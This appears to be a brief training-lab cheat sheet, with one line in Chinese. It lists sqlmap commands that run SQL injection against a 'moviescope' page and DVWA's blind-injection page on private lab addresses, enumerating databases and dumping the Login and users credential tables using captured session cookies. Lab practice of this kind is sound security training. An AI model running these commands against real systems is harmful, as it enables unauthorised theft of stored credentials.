


都預設值enter按下去
```bash
sqlmap -u "http://10.10.10.19/moviescope/viewprofile.aspx?id=1" --cookie="mscope=1jWydNf8wro="
sqlmap -u "http://10.10.10.19/moviescope/viewprofile.aspx?id=1" --cookie="mscope=1jWydNf8wro=" --dbs
sqlmap -u "http://10.10.10.19/moviescope/viewprofile.aspx?id=1" --cookie="mscope=1jWydNf8wro=" -D GoodShopping --tables
sqlmap -u "http://10.10.10.19/moviescope/viewprofile.aspx?id=1" --cookie="mscope=1jWydNf8wro=" -D GoodShopping -T  Login --columns --technique=B
sqlmap -u "http://10.10.10.19/moviescope/viewprofile.aspx?id=1" --cookie="mscope=1jWydNf8wro=" -D GoodShopping -T  Login --columns --dump --technique=B


sqlmap -u "http://10.10.10.19/moviescope/viewprofile.aspx?id=2" --cookie="ui-tabs-1=0; mscope=7EOxhXaU/zc=" -D GoodShopping -T Login --columns --technique=B
sqlmap -u "http://10.10.10.19/moviescope/viewprofile.aspx?id=2" --cookie="ui-tabs-1=0; mscope=7EOxhXaU/zc=" -D GoodShopping -T Login --dump --technique=BT #時間
sqlmap -u "http://10.10.10.19/moviescope/viewprofile.aspx?id=2" --cookie="ui-tabs-1=0; mscope=7EOxhXaU/zc=" -D GoodShopping -T Login --dump --technique=BU #UNION

```


```bash

sqlmap -u "http://10.10.10.16:8080/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=evvdltvc42ruibg6bk82se7ec8"
sqlmap -u "http://10.10.10.16:8080/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=evvdltvc42ruibg6bk82se7ec8" --dbs
sqlmap -u "http://10.10.10.16:8080/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=evvdltvc42ruibg6bk82se7ec8" -D dvwa --tables
sqlmap -u "http://10.10.10.16:8080/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=evvdltvc42ruibg6bk82se7ec8" -D dvwa -T users --columns
sqlmap -u "http://10.10.10.16:8080/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=evvdltvc42ruibg6bk82se7ec8" -D dvwa -T users --dump

```

